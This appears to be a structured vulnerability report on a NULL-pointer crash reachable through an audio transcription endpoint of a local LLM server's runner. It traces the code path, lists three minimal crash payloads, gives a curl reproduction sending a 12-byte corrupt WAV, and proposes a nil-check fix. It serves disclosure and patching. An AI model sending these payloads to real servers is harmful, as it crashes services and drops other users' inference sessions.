Phase: 10
Sequence: 040
Slug: audio-transcription-null-deref-mtmd
Verdict: VALID
Rationale: POST /v1/audio/transcriptions wraps attacker-controlled audio bytes as api.ImageData and routes them through the same unchecked C.mtmd_helper_bitmap_init_from_buf → C.mtmd_tokenize(&bm,1) NULL-deref sink confirmed in p8-040, with an additional trigger: models without audio capability (mtmd_get_audio_bitrate < 0) return NULL even for valid RIFF/WAVE payloads, crashing any llamarunner CLIP model deployed alongside the transcription endpoint.
Severity-Original: HIGH
Severity-Final: HIGH
PoC-Status: pending
Origin-Finding: archon/findings-draft/p8-040-mtmd-null-deref-image-bitmap.md
Origin-Pattern: AP-042

## Summary

`POST /v1/audio/transcriptions` is an alternate HTTP entry point that converges on the identical cgo NULL-deref sink identified in p8-040. The middleware (`middleware/openai.go:724-788`) reads up to 25 MB of multipart audio bytes and wraps them unconverted as `api.ImageData` via `openai.FromTranscriptionRequest` (`openai/openai.go:871`), placing them into `ChatRequest.Messages[1].Images[0]`. These bytes reach `runner/llamarunner/runner.go:236` -> `image.go:76` -> `llama/llama.go:566` where `C.mtmd_helper_bitmap_init_from_buf` is called without a nil check on its return value before passing `&bm` to `C.mtmd_tokenize`.

Three distinct NULL-return triggers exist on this path (each absent from the original p8-040 analysis):

1. **Garbage bytes** (fewer than 12 bytes, or no recognized magic): `is_audio_file` returns false; `stbi_load_from_memory` fails; returns `nullptr`.
2. **Valid RIFF/WAVE magic but corrupt content**: `decode_audio_from_buf` → `ma_decoder_init_memory` fails → returns `false` → `mtmd_helper_bitmap_init_from_buf` returns `nullptr`.
3. **Model does not support audio**: `mtmd_get_audio_bitrate(ctx) < 0` → function returns `nullptr` immediately; any RIFF-magic payload against a CLIP vision model (llava, moondream, minicpm-v) triggers this path.

In all three cases `bm == nullptr` reaches line 570 and `mtmd_tokenize` dereferences it at `mtmd.cpp:538` (`bitmap->is_audio`) causing SIGSEGV in the runner subprocess.

The 25 MB multipart cap (absent on the `/api/generate` path covered by p8-040 and p8-050) does not prevent the crash; a single 12-byte payload (RIFF+WAVE magic header, no data) is sufficient for trigger #2 or #3.

## Location

- `server/routes.go:1730` -- `r.POST("/v1/audio/transcriptions", middleware.TranscriptionMiddleware(), s.ChatHandler)` — distinct entry point
- `middleware/openai.go:724-788` -- `TranscriptionMiddleware`: 25 MB multipart cap; reads audio bytes; wraps as `Images: []api.ImageData{r.AudioData}` at `openai/openai.go:871`
- `runner/llamarunner/runner.go:236` -- `s.image.MultimodalTokenize(s.lc, images[imageIndex].Data)` — audio bytes treated identically to image bytes
- `llama/llama.go:566` -- `bm := C.mtmd_helper_bitmap_init_from_buf(c.c, (*C.uchar)(unsafe.Pointer(&data[0])), C.size_t(len(data)))` — returns NULL for all three trigger conditions
- `llama/llama.go:567` -- `defer C.mtmd_bitmap_free(bm)` — NULL-safe free; obscures missing nil check
- `llama/llama.go:570` -- `C.mtmd_tokenize(c.c, ic, it, &bm, 1)` — passes &nil without nil check
- `llama.cpp/tools/mtmd/mtmd.cpp:538` -- `if (!bitmap->is_audio)` — NULL-deref SIGSEGV sink
- `llama/llama.cpp/tools/mtmd/mtmd-helper.cpp:473-477` -- audio bitrate check; `mtmd_get_audio_bitrate(ctx) < 0` → `return nullptr`
- `llama/llama.cpp/tools/mtmd/mtmd-helper.cpp:478-482` -- `decode_audio_from_buf` failure → `return nullptr`
- `llama/llama.cpp/tools/mtmd/mtmd-helper.cpp:488-493` -- `stbi_load_from_memory` failure → `return nullptr`

## Attacker Control

Unauthenticated HTTP client sends multipart/form-data with a crafted audio file to `POST /v1/audio/transcriptions`. Three minimal payloads:

- Trigger 1 (garbage): `file` = single byte `\x00` → `is_audio_file` false → stb_image fails → NULL
- Trigger 2 (corrupt WAVE): `file` = `RIFF\x04\x00\x00\x00WAVE` (12 bytes, valid magic, no fmt chunk) → `ma_decoder_init_memory` fails → NULL
- Trigger 3 (CLIP model, audio unsupported): `file` = valid WAV header against any CLIP-based llamarunner model → `mtmd_get_audio_bitrate(ctx) < 0` → NULL

All three payloads pass through the zero-length guard at `runner/llamarunner/image.go:64-66` (only checks `len(data) <= 0`).

## Trust Boundary Crossed

Unauthenticated HTTP multipart form upload (`POST /v1/audio/transcriptions`) → runner subprocess cgo stack → SIGSEGV in `mtmd.cpp:538`.

## Impact

Same as p8-040: runner subprocess SIGSEGV; all concurrent inference sessions on that runner drop; cold-start reload required (seconds to minutes). A single 12-byte multipart upload triggers the crash. With trigger #3 (CLIP model), even a structurally valid WAV file crashes any non-audio vision model permanently as long as the attacker can send requests, with no recourse except patching.

The 25 MB multipart cap limits RAM exhaustion (mitigating p8-050) but does NOT prevent the null-deref DoS.

Cross-user impact identical to p8-040: one malicious request drops all active sessions on the target model.

## Evidence

Static trace (2026-04-17, variant hunt phase):

```
// Entry: server/routes.go:1730
r.POST("/v1/audio/transcriptions", middleware.TranscriptionMiddleware(), s.ChatHandler)

// TranscriptionMiddleware: middleware/openai.go:760-771
req := openai.TranscriptionRequest{
    AudioData: audioData,  // raw bytes from multipart upload
    ...
}
chatReq, err := openai.FromTranscriptionRequest(req)

// openai/openai.go:871
{Role: "user", Content: "Transcribe this audio.", Images: []api.ImageData{r.AudioData}}
// AudioData placed into Images field — same field as image data in p8-040

// runner/llamarunner/runner.go:236
chunks, err := s.image.MultimodalTokenize(s.lc, images[imageIndex].Data)
// images[0].Data = AudioData (raw bytes from multipart)

// llama/llama.go:566-570
bm := C.mtmd_helper_bitmap_init_from_buf(c.c, (*C.uchar)(unsafe.Pointer(&data[0])), C.size_t(len(data)))
defer C.mtmd_bitmap_free(bm)    // NULL-safe; no nil check
// NO nil check before:
if C.int32_t(0) != C.mtmd_tokenize(c.c, ic, it, &bm, 1) { ... }

// mtmd-helper.cpp:470-497
mtmd_bitmap * mtmd_helper_bitmap_init_from_buf(...) {
    if (audio_helpers::is_audio_file(buf, len)) {
        int bitrate = mtmd_get_audio_bitrate(ctx);
        if (bitrate < 0) { return nullptr; }          // trigger 3: CLIP model
        if (!audio_helpers::decode_audio_from_buf(...)) { return nullptr; }  // trigger 2
        return mtmd_bitmap_init_from_audio(...);
    }
    // trigger 1: non-audio bytes
    auto * data = stbi_load_from_memory(buf, len, &nx, &ny, &nc, 3);
    if (!data) { return nullptr; }
    ...
}

// mtmd.cpp:538  — SIGSEGV sink
if (!bitmap->is_audio) { ... }   // bitmap == NULL → SIGSEGV
```

KB confirmation: `archon/knowledge-base-report.md:2047` lists audio transcription path with no noted mitigation for null-deref. Chamber debate H-NEW-46 (`archon/chamber-workspace/chamber-03/debate.md:1421-1447`) confirms audio data reaches `C.mtmd_helper_bitmap_init_from_buf` via this route. Trigger #3 (model capability mismatch) not previously analyzed.

## Reproduction Steps

1. Pull any CLIP-based llamarunner model (e.g., `ollama pull llava` or any model with a `projectors` slice in its manifest directing to the legacy engine).
2. Confirm model is loaded on llamarunner: check `llm/server.go:148-158` (non-empty `projectors` → legacy engine).
3. Send a 12-byte corrupt WAV (trigger 2 / trigger 3):
   ```
   curl -X POST http://127.0.0.1:11434/v1/audio/transcriptions \
     -F model=llava \
     -F "file=@/dev/stdin;filename=x.wav;type=audio/wav" \
     <<< $'RIFF\x04\x00\x00\x00WAVE'
   ```
4. Observe SIGSEGV in runner subprocess logs; concurrent sessions dropped.
5. Fix: add `if bm == nil { return nil, fmt.Errorf("unsupported audio/image format") }` after line 567 and before line 570 in `llama/llama.go`, matching the fix direction for p8-040.
